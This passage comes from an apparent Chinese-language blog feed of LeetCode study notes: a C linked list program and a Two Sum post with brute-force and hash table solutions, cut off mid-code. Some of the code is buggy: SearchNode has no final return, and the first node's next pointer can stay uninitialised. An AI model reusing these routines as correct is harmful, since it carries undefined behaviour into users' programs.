class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define node</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line">Node *first_node;</span><br><span class="line">Node *current_node;</span><br><span class="line">Node *previous_node;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare Fuctions</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>;</span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>;</span><br><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">( Node* first,Node* node)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> node_numbers;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The numbers of nodes:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;node_numbers);</span><br><span class="line">    create_new_node(node_numbers);</span><br><span class="line">    current_node = first_node;</span><br><span class="line">    <span class="keyword">while</span> (current_node!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]|&quot;</span>,current_node);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data: %d&quot;</span>,current_node-&gt;data);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;| Addr. of next node=%p \n&quot;</span>,current_node-&gt;next);</span><br><span class="line">        current_node=current_node-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Traverse the list of nodes</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=========================================================\n\n&quot;</span>);</span><br><span class="line">    PrintList(first_node);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Serach Nodes: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;item);</span><br><span class="line">    <span class="keyword">if</span> (SearchNode(first_node,item))&#123; <span class="built_in">printf</span>(<span class="string">&quot;Node found\n&quot;</span>);&#125; <span class="keyword">else</span> &#123;<span class="built_in">printf</span>(<span class="string">&quot;Node not found\n&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Insert Node:&quot;</span>);</span><br><span class="line">    <span class="comment">// User input data</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;item);</span><br><span class="line">    <span class="keyword">if</span> (SearchNode(first_node,item))&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Node exisit in the list&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Insert behind the current node</span></span><br><span class="line">        InsertNode(first_node,item);</span><br><span class="line">        PrintList(first_node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reverse the list\n&quot;</span>);</span><br><span class="line">    Reverse();</span><br><span class="line">    PrintList(first_node);</span><br><span class="line"></span><br><span class="line">    FreeList(first_node);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; node_nums; i++)&#123;</span><br><span class="line">        <span class="comment">// Declare new node</span></span><br><span class="line">        current_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data for node %d : &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// Enter node data</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(current_node-&gt;data));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// First node, don&#x27;t have previous node, so let the first_node and previous_node equal to current_node</span></span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">            first_node = current_node;</span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// Set the previous node point to the current node</span></span><br><span class="line">            previous_node-&gt;next = current_node;</span><br><span class="line">            current_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// Set the previous node to current node, prepare to next node creation (or not)</span></span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// input parameter is node struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    <span class="comment">// Decalre the address of input node</span></span><br><span class="line">    Node *node = first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt; &quot;</span>, node-&gt;data);</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Null \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *current, *temp_node;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="comment">// Put the node that wants to be removed into temp_node</span></span><br><span class="line">        temp_node = current;</span><br><span class="line">        <span class="comment">// Let the current node point to the next node</span></span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="comment">// Free the node</span></span><br><span class="line">        <span class="built_in">free</span>(temp_node);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return value should be the address of the node</span></span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * node = first;</span><br><span class="line">    <span class="keyword">while</span> ( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == item)&#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node *new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="comment">// Point the new node to the nexy item of original node</span></span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = node-&gt;next;</span><br><span class="line">    <span class="comment">// Point the original node to new node</span></span><br><span class="line">    node -&gt; next = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert a node to the front of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span>  item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = first_node; <span class="comment">// new node pointer point to original first node</span></span><br><span class="line">    first_node = new_node;  <span class="comment">// Update the first node to the new node</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert a node to the back of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Handle empty list</span></span><br><span class="line">    <span class="keyword">if</span> (first_node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        first_node = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// Initailize the current node to the first node for traversal</span></span><br><span class="line">        Node * current_node = first_node;</span><br><span class="line">        <span class="keyword">while</span> (current_node-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">// traverse through the list</span></span><br><span class="line">            current_node = current_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Point to the new node</span></span><br><span class="line">        current_node-&gt;next = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Node *current, *previous, *preceding;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line">    current = first_node;</span><br><span class="line">    <span class="comment">// preceding node store the previous address of the current node</span></span><br><span class="line">    preceding = first_node-&gt;next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (preceding != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// pointer the current node to the NULL (previous) node</span></span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        <span class="comment">// Update previous poinert to current pointer</span></span><br><span class="line">        previous = current;</span><br><span class="line">        <span class="comment">// Update current pointer to the preceding point</span></span><br><span class="line">        current = preceding;</span><br><span class="line">        <span class="comment">// Update the preceding pointer to the next node;</span></span><br><span class="line">        preceding = preceding-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next =previous;</span><br><span class="line">    first_node=current;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h2><p><img src="/img/LeetCode/Linked_List/result-1.png"><br><img src="/img/LeetCode/Linked_List/result-2.png"></p><blockquote><p>總結: 透過這次的整理，算是有更加熟悉已經忘光的 linked list 操作，接下來就直接拿相關的LeetCode題目當練習吧</p></blockquote><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>[1] <a href="https://jacychu.medium.com/leetcode-linked-list-%E9%8F%88%E7%B5%90%E4%B8%B2%E5%88%97-c2edabee9958">https://jacychu.medium.com/leetcode-linked-list-%E9%8F%88%E7%B5%90%E4%B8%B2%E5%88%97-c2edabee9958</a><br>[2] <a href="https://codimd.mcl.math.ncu.edu.tw/s/B1rd5-sM4#%E6%8F%92%E5%85%A5%E7%AF%80%E9%BB%9E%E5%87%BD%E6%95%B8-InsertNode-">https://codimd.mcl.math.ncu.edu.tw/s/B1rd5-sM4#%E6%8F%92%E5%85%A5%E7%AF%80%E9%BB%9E%E5%87%BD%E6%95%B8-InsertNode-</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>應用 Hash Table | LeetCode#1  Two Sum</title>
      <link href="/posts/cb46ac9d.html"/>
      <url>/posts/cb46ac9d.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/Two_Sum/two_sum_question.png"></p><p>題目描述給定整數的陣列以及整數 <code>target</code> 值，請在陣列找到任兩元素相加等於 target，並且回傳元素的索引，另外對於每個輸入陣列只會有一組輸出答案。</p><h1 id="解法-1-暴力解"><a href="#解法-1-暴力解" class="headerlink" title="解法-1: 暴力解"></a>解法-1: 暴力解</h1><p>首先一樣從暴力解開始，先有解法，後續再看要怎麼優化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="comment">// init return array</span></span><br><span class="line">    <span class="type">int</span>* results = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// i could not iterated to n-1, since every element is compared.</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; numsSize<span class="number">-1</span>; i++)&#123; </span><br><span class="line">        <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; numsSize; j++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                results[<span class="number">0</span>] = i;</span><br><span class="line">                results[<span class="number">1</span>] = j;</span><br><span class="line">                *returnSize = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">return</span> results;</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// If no solution is found</span></span><br><span class="line">    <span class="built_in">free</span>(results); <span class="comment">// Free the allocated memory before returning</span></span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡的核心做法為: <strong>選擇一個元素，去比較另一個元素，看相加是否為 <code>target</code></strong></p><p>但這麼做的時間複雜度為 $O(n^2)$</p><p>另外因為題目要求回傳陣列需要動態宣告，因此在結尾必須釋放記憶體位址 <code>*returnSize</code> 是用來告訴呼叫者返回的陣列的大小。由於 C 語言不支援直接返回多個值，題目需要指標來修改外部變數，這樣可以傳遞更多的資訊。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果:"></a>執行結果:</h3><p><img src="/img/LeetCode/Two_Sum/two_sum_result-2.png"></p><h1 id="解法-2-使用雜湊表-Hash-Table"><a href="#解法-2-使用雜湊表-Hash-Table" class="headerlink" title="解法-2: 使用雜湊表(Hash Table)"></a>解法-2: 使用雜湊表(Hash Table)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Define hash </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(key) % size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Define hash table structure.</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        <span class="type">bool</span> hasData;</span><br><span class="line">    &#125; twosum;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hashtableSize = numsSize * <span class="number">2</span>; </span><br><span class="line">    twosum* hashtable = (twosum*)<span class="built_in">calloc</span>(hashtableSize, <span class="keyword">sizeof</span>(twosum));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize return array</span></span><br><span class="line">    <span class="type">int</span>* results = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>)); </span><br><span class="line">    <span class="keyword">if</span> (!results) <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// Return NULL if memory allocation fails</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init hash table</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;hashtableSize;i++)&#123;   </span><br><span class="line">        hashtable[i].key=<span class="number">0</span>;</span><br><span class="line">        hashtable[i].value=<span class="number">0</span>;</span><br><span class="line">        hashtable[i].hasData = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// insert key to certain index.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; numsSize; i++)&#123;</span><br><span class="line">        <span class="comment">// only needs to insert the complement number</span></span><br><span class="line">        <span class="type">int</span> complement = target - nums[i]; </span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> index = hash(complement, hashtableSize); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Linear probing for searching empty slot</span></span><br><span class="line">        <span class="keyword">while</span>(hashtable[index].hasData )&#123;</span><br><span class="line">            <span class="comment">// find target</span></span><br><span class="line">            <span class="keyword">if</span> ( hashtable[index].key == complement)&#123;</span><br><span class="line">                results[<span class="number">0</span>] = hashtable[index].value;</span><br><span class="line">                results[<span class="number">1</span>] = i;</span><br><span class="line">                *returnSize = <span class="number">2</span>;</span><br><span class="line">                <span class="built_in">free</span>(hashtable);</span><br><span class="line">                <span class="keyword">return</span> results;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// try to find empty index.</span></span><br><span class="line">            index = hash(index+<span class="number">1</span>, hashtableSize); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// insert current number</span></span><br><span class="line">        index = hash(nums[i], hashtableSize); </span><br><span class="line">        <span class="keyword">while</span> (hashtable[index].hasData) &#123;</span><br><span class="line">            index = hash(index+<span class="number">1</span>, hashtableSize);</span><br><span class="line">        &#125;</span><br><span class="line">        hashtable[index].key = nums[i]; </span><br><span class="line">        hashtable[index].value = i;</span><br><span class="line">        hashtable[index].hasData = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(hashtable);</span><br><span class="line">    <span class="built_in">free</span>(results);</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程式的主要的流程為:</p><ul><li>定義 hashtable 結構以及 hashtable 大小</li><li>定義 hash function</li><li>初始化回傳陣列</li><li>初始化 hashtable</li><li>插入元素，需要先判斷 index 內是否已經有元素存在<ul><li>發生碰撞時，透過 Linear Probing 來處理碰撞，找到空位址</li><li>若無元素存在則直接插入元素</li></ul></li><li>釋放記憶體，返回回傳陣列</li></ul><p>這種作法又被稱為 <strong>Two-pass Hash Table</strong>，主要原因是他經過兩次迭代，一次將元素的值和索引填到 hashtable的 key跟value，另一次檢查每個元素的 complement 是否存在於 hash table 當中。</p><p>這樣透過雜湊表的執行時間複雜度可以降到 $O(n)$，其實查找Hash Table的時間複雜度會是 $O(1)$，但考量到碰撞可能發生，進行 Linear Probing，這會讓整體的時間複雜度變成 $O(n)$。</p><p><img src="/img/LeetCode/Two_Sum/two_sum_result.png"></p><h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>原本在實作的時候，我原本的 hashtable 結構只有定義</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">    &#125; twosum;</span><br></pre></td></tr></table></figure><p>並且在判斷式是使用 <code>while( hashtable[index].key != 0 || hashtable[index].value != 0 )</code></p><p>但後面發現對特定的測資會出現問題，像是 <code>nums = [0,4,3,0]</code> 並且 <code>target= 0</code>的時候，並不會有任何輸出出現</p><h2 id="問題分析"><a href="#問題分析" class="headerlink" title="問題分析"></a>問題分析</h2><p>原因是在插入hash table 的時候，以第一個元素為例，插入至hashtable的key會是 0，<strong>但我們在初始化將沒有資料的狀況定義成0，並且在中間判斷式也以0作為有無值的判斷依據</strong>，但在想要出儲存的值本身為 0 時，這樣會發生衝突，因此後續解法就是在 hashtable 的結構中定義一個 <code>hasData</code> 來判斷是否有資料存在。</p><p>但這麼做也有缺點，那就是增加了空間複雜度。</p><h1 id="其他解法-One-Pass-Hash"><a href="#其他解法-One-Pass-Hash" class="headerlink" title="其他解法 - One Pass Hash"></a>其他解法 - One Pass Hash</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> 